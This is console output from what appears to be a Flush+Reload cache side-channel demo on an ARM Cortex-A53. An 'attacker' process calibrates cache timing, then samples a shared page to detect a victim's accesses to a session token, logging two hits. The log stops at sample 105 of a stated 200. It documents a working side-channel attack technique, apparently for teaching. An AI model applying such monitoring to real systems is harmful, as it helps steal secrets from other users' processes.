╔══════════════════════════════════════════════════════════════╗
║  Flush+Reload Demo  –  ATTACKER  (ARMv8 / Cortex-A53)      ║
║  Monitoring spy file for victim accesses to session token.  ║
╚══════════════════════════════════════════════════════════════╝

[attacker] Timer frequency: 19200000 Hz  (52.1 ns/tick)

[attacker] Waiting for spy file '/tmp/fr_demo_spy' …

[attacker] Spy file opened (fd=4)
[attacker] Spy page mapped at virtual 0xffffad72e000  (shared physical page)

[attacker] ── Phase 1: Calibration ──────────────────────────
[attacker] Calibration results (200 samples):
[attacker]   L2 cache HIT  =    133 ns  (line already in cache)
[attacker]   DRAM miss     =   2020 ns  (line not in cache)
[attacker]   Threshold     =   1076 ns  (midpoint)

[attacker] ── Phase 2: Flush+Reload Sampling ─────────────────
[attacker] Collecting 200 samples (warmup=10, wait=70 ms per sample)

  Sample  Reload(ns)  Decision  Running hit count
  ──────  ──────────  ────────  ─────────────────
  1       2291        miss      0 hits so far  (warmup)
  2       2239        miss      0 hits so far  (warmup)
  3       2343        miss      0 hits so far  (warmup)
  4       2656        miss      0 hits so far  (warmup)
  5       1562        miss      0 hits so far  (warmup)
  6       1145        miss      0 hits so far  (warmup)
  7       1822        miss      0 hits so far  (warmup)
  8       1614        miss      0 hits so far  (warmup)
  9       1875        miss      0 hits so far  (warmup)
  10      1770        miss      0 hits so far  (warmup)
  11      2552        miss      0 hits so far
  12      1770        miss      0 hits so far
  13      1614        miss      0 hits so far
  14      1354        miss      0 hits so far
  15      1979        miss      0 hits so far
  16      2187        miss      0 hits so far
  17      2083        miss      0 hits so far
  18      2031        miss      0 hits so far
  19      2343        miss      0 hits so far
  20      2239        miss      0 hits so far
  21      2968        miss      0 hits so far
  22      2187        miss      0 hits so far
  23      2708        miss      0 hits so far
  24      2135        miss      0 hits so far
  25      2968        miss      0 hits so far
  26      2239        miss      0 hits so far
  27      2552        miss      0 hits so far
  28      2447        miss      0 hits so far
  29      2187        miss      0 hits so far
  30      2604        miss      0 hits so far
  31      2187        miss      0 hits so far
  32      1666        miss      0 hits so far
  33      1770        miss      0 hits so far
  34      1406        miss      0 hits so far
  35      1250        miss      0 hits so far
  36      2500        miss      0 hits so far
  37      1458        miss      0 hits so far
  38      1718        miss      0 hits so far
  39      1614        miss      0 hits so far
  40      1510        miss      0 hits so far
  41      1666        miss      0 hits so far
  42      1145        miss      0 hits so far
  43      1979        miss      0 hits so far
  44      2656        miss      0 hits so far
  45      1510        miss      0 hits so far
  46      3437        miss      0 hits so far
  47      2604        miss      0 hits so far
  48      1406        miss      0 hits so far
  49      1562        miss      0 hits so far
  50      1406        miss      0 hits so far
  51      1458        miss      0 hits so far
  52      2500        miss      0 hits so far
  53      1927        miss      0 hits so far
  54      1875        miss      0 hits so far
  55      1614        miss      0 hits so far
  56      1510        miss      0 hits so far
  57      1614        miss      0 hits so far
  58      1614        miss      0 hits so far
  59      2083        miss      0 hits so far
  60      625         HIT ◄   1 hits so far
  61      2447        miss      1 hits so far
  62      2343        miss      1 hits so far
  63      1458        miss      1 hits so far
  64      1458        miss      1 hits so far
  65      1666        miss      1 hits so far
  66      2291        miss      1 hits so far
  67      1510        miss      1 hits so far
  68      781         HIT ◄   2 hits so far
  69      2447        miss      2 hits so far
  70      1562        miss      2 hits so far
  71      2239        miss      2 hits so far
  72      1875        miss      2 hits so far
  73      1458        miss      2 hits so far
  74      1145        miss      2 hits so far
  75      1666        miss      2 hits so far
  76      1666        miss      2 hits so far
  77      2760        miss      2 hits so far
  78      1718        miss      2 hits so far
  79      2239        miss      2 hits so far
  80      1770        miss      2 hits so far
  81      1562        miss      2 hits so far
  82      1302        miss      2 hits so far
  83      1510        miss      2 hits so far
  84      1822        miss      2 hits so far
  85      2083        miss      2 hits so far
  86      1770        miss      2 hits so far
  87      2500        miss      2 hits so far
  88      1458        miss      2 hits so far
  89      1927        miss      2 hits so far
  90      1145        miss      2 hits so far
  91      1510        miss      2 hits so far
  92      1406        miss      2 hits so far
  93      2447        miss      2 hits so far
  94      1770        miss      2 hits so far
  95      1197        miss      2 hits so far
  96      1302        miss      2 hits so far
  97      1354        miss      2 hits so far
  98      1718        miss      2 hits so far
  99      1666        miss      2 hits so far
  100     2395        miss      2 hits so far
  101     2447        miss      2 hits so far
  102     1406        miss      2 hits so far
  103     2552        miss      2 hits so far
  104     2343        miss      2 hits so far
  105     1406        miss      2 hits so far
